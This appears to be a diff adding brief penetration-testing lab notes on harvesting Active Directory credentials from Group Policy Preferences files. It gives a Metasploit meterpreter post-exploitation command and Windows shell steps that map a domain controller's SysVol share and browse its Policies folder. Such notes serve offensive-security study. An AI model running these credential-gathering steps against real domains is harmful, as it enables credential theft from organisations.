@@ -1,0 +1,28 @@
+GATHER-GPP-CREDS
+active directory credentials
+
+from meterpreter:
+
+run post/windows/gather/credentials/gpp
+
+
+from windows shell
+
+Active Directory policies are stored in a special UNC path:
+
+from windows shell
+
+%USERDOMAIN%\Policies
+
+But you cannot access UNC paths via cmd, so you have to use the Sysvol share you can find
+on a domain controller:
+
+%LOGONSERVER%\Sysvol
+
+To do that in the lab environment you can type:
+> net use X: \\DC01\SysVol
+> X:
+> cd examplead.lan\Policies
+> dir
+
+
